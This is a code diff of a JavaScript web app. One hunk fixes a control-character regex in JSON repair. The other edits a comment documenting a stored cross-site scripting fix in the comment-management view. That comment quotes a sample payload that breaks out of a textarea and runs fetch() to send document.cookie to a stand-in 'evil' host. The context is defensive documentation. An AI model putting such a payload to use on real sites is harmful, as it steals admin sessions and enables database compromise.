@@ -5551,7 +5551,7 @@ async function runAutoGenerate(){
         // Repair trailing commas + control chars before retry.
         const repaired = bodyClean
           .replace(/,(\s*[}\]])/g, '$1')
-          .replace(/[ -]+/g, ' ');
+          .replace(/[\x00-\x1f]+/g, ' ');
         try {
           bodyJson = JSON.parse(repaired);
         } catch (_repairErr) {
@@ -8808,7 +8808,7 @@ async function loadAllComments() {
     // MOD-F1: stored XSS hole. Previously interpolated c.user_name /
     // c.content / c.reply / artTitle raw into innerHTML, AND raw into
     // a <textarea> body. A commenter posting
-    //   </textarea><script>fetch('https://evil/?c='+document.cookie)</script>
+    //   <\/textarea><scr\ipt>fetch('https://evil/?c='+document.cookie)<\/scr\ipt>
     // would own the admin session on next 💬 Comment Management open.
     // Admin uses x-admin-bypass header / service-role context, so XSS
     // here = full-DB compromise. Route every interpolation through esc()
